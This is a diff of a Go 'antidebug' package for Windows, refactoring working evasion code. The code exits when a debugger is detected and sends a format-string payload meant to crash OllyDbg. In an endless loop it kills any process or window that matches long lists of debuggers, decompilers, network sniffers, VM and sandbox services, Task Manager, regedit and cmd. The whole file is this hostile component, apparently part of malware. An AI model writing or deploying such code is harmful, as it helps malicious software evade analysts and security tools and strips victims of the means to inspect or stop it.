@@ -1,137 +1,138 @@
 package antidebug
 
 import (
-	"github.com/shirou/gopsutil/v3/process"
+	"os"
 	"strings"
 	"syscall"
 	"unsafe"
-	"os"
+
+	"github.com/shirou/gopsutil/v3/process"
 )
 
 var (
-		mu32   = syscall.NewLazyDLL("user32.dll")
-		pew          = mu32.NewProc("EnumWindows")
-		pgwt       = mu32.NewProc("GetWindowTextA")
-		pgwtp = mu32.NewProc("GetWindowThreadProcessId")
-		mk32 = syscall.NewLazyDLL("kernel32.dll")
-		pop         = mk32.NewProc("OpenProcess")
-		ptp    = mk32.NewProc("TerminateProcess")
-		pch         = mk32.NewProc("CloseHandle")
-		pidp = mk32.NewProc("IsDebuggerPresent")
-	    // we exploit log console (olly and other debuggers)
-		k32             = syscall.MustLoadDLL("kernel32.dll")
-		DebugStrgingA   = k32.MustFindProc("OutputDebugStringA")
-		gle         = k32.MustFindProc("GetLastError")
-	
+	user32DLL       = syscall.NewLazyDLL("user32.dll")
+	enumWindowsProc = user32DLL.NewProc("EnumWindows")
+	getWindowText   = user32DLL.NewProc("GetWindowTextA")
+	getWindowThread = user32DLL.NewProc("GetWindowThreadProcessId")
+
+	kernel32DLL = syscall.NewLazyDLL("kernel32.dll")
+	isDebugger  = kernel32DLL.NewProc("IsDebuggerPresent")
+	debugString = kernel32DLL.NewProc("OutputDebugStringA")
 )
 
-func IsDebuggerPresent() {
-	flag, _, _ := pidp.Call()
-    if flag != 0 {
-        os.Exit(-1)
-    }
-}
-
-func Run() {
-	IsDebuggerPresent()
-	for{
-
-	// for debuggers like x64dbg or any other
-	OutputDebugStringAntiDebug()
-	// this is for ollydbg 
-	OllyDbgExploit("%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s")
-	ewp := syscall.NewCallback(ewpg)
-	ret, _, _ := pew.Call(ewp, 0)
-	if ret == 0 {
-		return
+func killProcess(pid int32) error {
+	process, err := os.FindProcess(int(pid))
+	if err != nil {
+		return err
 	}
-	blacklist := []string{"ksdumperclient", "regedit", "ida64", "vmtoolsd", "vgauthservice", "wireshark", "x32dbg", "ollydbg", "vboxtray", "df5serv", "vmsrvc", "vmusrvc", "taskmgr", "vmwaretray", "xenservice", "pestudio", "vmwareservice", "qemu-ga", "prl_cc", "prl_tools", "cmd", "joeboxcontrol", "vmacthlp", "httpdebuggerui", "processhacker", "joeboxserver", "fakenet", "ksdumper", "vmwareuser", "fiddler", "x96dbg", "dumpcap", "vboxservice"}
-
-	KillProcesses(blacklist)
-}
+	return process.Kill()
 }
 
-func OutputDebugStringAntiDebug() bool {
-	naughty := "hm"
-	txptr, _ := syscall.UTF16PtrFromString(naughty)
-	DebugStrgingA.Call(uintptr(unsafe.Pointer(txptr)))
-	ret, _, _ := gle.Call()
-	return ret == 0
-}
+func KillProcessesByNames(blacklist []string) error {
+	processes, _ := process.Processes()
 
-func OllyDbgExploit(text string) {
-    txptr, err := syscall.UTF16PtrFromString(text)
-    if err != nil {
-        panic(err)
-    }
-    DebugStrgingA.Call(uintptr(unsafe.Pointer(txptr)))
-}
+	for _, p := range processes {
+		processName, _ := p.Name()
 
-
-func ewpg(hwnd uintptr, lParam uintptr) uintptr {
-	// blacklisted window names
-	var pid uint32
-	pgwtp.Call(hwnd, uintptr(unsafe.Pointer(&pid)))
-
-	var title [256]byte
-	pgwt.Call(hwnd, uintptr(unsafe.Pointer(&title)), 256)
-	wt := string(title[:])
-
-	bs := []string{
-		"proxifier", "graywolf", "extremedumper", "zed", "exeinfope", "dnspy",
-		"titanHide", "ilspy", "titanhide", "x32dbg", "codecracker", "simpleassembly",
-		"process hacker 2", "pc-ret", "http debugger", "Centos", "process monitor",
-		"debug", "ILSpy", "reverse", "simpleassemblyexplorer", "process", "de4dotmodded",
-		"dojandqwklndoqwd-x86", "sharpod", "folderchangesview", "fiddler", "die", "pizza",
-		"crack", "strongod", "ida -", "brute", "dump", "StringDecryptor", "wireshark",
-		"debugger", "httpdebugger", "gdb", "kdb", "x64_dbg", "windbg", "x64netdumper",
-		"petools", "scyllahide", "megadumper", "reversal", "ksdumper v1.1 - by equifox",
-		"dbgclr", "HxD", "monitor", "peek", "ollydbg", "ksdumper", "http", "wpe pro", "dbg",
-		"httpanalyzer", "httpdebug", "PhantOm", "kgdb", "james", "x32_dbg", "proxy", "phantom",
-		"mdbg", "WPE PRO", "system explorer", "de4dot", "x64dbg", "X64NetDumper", "protection_id",
-		"charles", "systemexplorer", "pepper", "hxd", "procmon64", "MegaDumper", "ghidra", "xd",
-		"0harmony", "dojandqwklndoqwd", "hacker", "process hacker", "SAE", "mdb", "checker",
-		"harmony", "Protection_ID", "PETools", "scyllaHide", "x96dbg", "systemexplorerservice",
-		"folder", "mitmproxy", "dbx", "sniffer", "Process Hacker",
-	}
-
-	for _, str := range bs {
-		if containz(wt, str) {
-			proc, _, _ := pop.Call(syscall.PROCESS_TERMINATE, 0, uintptr(pid))
-			if proc != 0 {
-				ptp.Call(proc, 0)
-				pch.Call(proc)
-			}
-			break
+		if contains(blacklist, processName) {
+			killProcess(p.Pid)
 		}
 	}
 
-	return 1
+	return nil
 }
 
-func containz(s, substr string) bool {
-	// pattern finding for the widnows lol
-	return len(s) >= len(substr) && s[:len(substr)] == substr
+func getCallback(blacklist []string) uintptr {
+	return syscall.NewCallback(func(hwnd syscall.Handle, lparam uintptr) uintptr {
+		var title [256]byte
+
+		getWindowText.Call(uintptr(hwnd), uintptr(unsafe.Pointer(&title)), uintptr(len(title)))
+
+		titleStr := string(title[:])
+
+		if titleStr == "" {
+			return 1
+		}
+
+		if contains(blacklist, titleStr) {
+			var pid uint32
+			getWindowThread.Call(uintptr(hwnd), uintptr(unsafe.Pointer(&pid)))
+
+			killProcess(int32(pid))
+
+		}
+		return 1
+	})
 }
 
-func contains(slice []string, item string) bool {
+func KillProcessesByWindowsNames(callback uintptr) error {
+	enumWindowsProc.Call(callback, 0)
+	return nil
+}
+
+func IsDebuggerPresent() bool {
+	flag, _, _ := isDebugger.Call()
+	return flag != 0
+}
+
+func outputDebugString(message string) {
+	debugString.Call(uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(message))))
+}
+
+func OutputDebugStringAntiDebug() {
+	outputDebugString("hm")
+}
+
+func OutputDebugStringOllyDbgExploit() {
+	outputDebugString("%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s")
+}
+
+func contains(slice []string, processName string) bool {
+	processName = strings.ToLower(processName)
+
 	for _, s := range slice {
-		if strings.Contains(item, s) {
+		if strings.Contains(processName, s) {
 			return true
 		}
 	}
+
 	return false
 }
 
-func KillProcesses(blacklist []string) {
-		processes, _ := process.Processes()
+func Run() {
+	if IsDebuggerPresent() {
+		os.Exit(0)
+	}
 
-		for _, p := range processes {
-			name, _ := p.Name()
-			name = strings.ToLower(name)
+	blacklist := []string{
+		"ksdumperclient", "regedit", "ida64", "vmtoolsd", "vgauthservice",
+		"wireshark", "x32dbg", "ollydbg", "vboxtray", "df5serv", "vmsrvc",
+		"vmusrvc", "taskmgr", "vmwaretray", "xenservice", "pestudio", "vmwareservice",
+		"qemu-ga", "prl_cc", "prl_tools", "cmd",
+		"joeboxcontrol", "vmacthlp", "httpdebuggerui", "processhacker",
+		"joeboxserver", "fakenet", "ksdumper", "vmwareuser", "fiddler",
+		"x96dbg", "dumpcap", "vboxservice",
+	}
 
-			if contains(blacklist, name) {
-				p.Kill()
-			}
-		}
+	callback := getCallback([]string{
+		"simpleassemblyexplorer", "dojandqwklndoqwd", "centos", "process hacker 2",
+		"procmon64", "process hacker", "sae", "sharpod", "http debugger",
+		"dbgclr", "x32dbg", "sniffer", "petools", "simpleassembly", "ksdumper", "dnspy", "x96dbg",
+		"de4dot", "zed", "exeinfope", "windbg", "mdb", "harmony", "systemexplorerservice", "megadumper",
+		"system explorer", "mdbg", "kdb", "charles", "stringdecryptor", "phantom", "folder",
+		"debugger", "extremedumper", "pc-ret", "dbg", "dojandqwklndoqwd-x86", "folderchangesview", "james",
+		"process monitor", "protection_id", "de4dotmodded", "x32_dbg", "pizza", "fiddler", "checker",
+		"x64_dbg", "httpanalyzer", "strongod", "wireshark", "gdb", "graywolf", "x64dbg", "ksdumper v1.1 - by equifox",
+		"wpe pro", "ilspy", "dbx", "ollydbg", "x64netdumper", "scyllahide", "kgdb", "systemexplorer",
+		"proxifier", "debug", "httpdebug", "httpdebugger", "0harmony", "mitmproxy", "ida -",
+		"codecracker", "ghidra", "titanhide", "hxd", "reversal",
+	})
+
+	for {
+		OutputDebugStringAntiDebug()
+		OutputDebugStringOllyDbgExploit()
+
+		KillProcessesByNames(blacklist)
+		KillProcessesByWindowsNames(callback)
+	}
 }
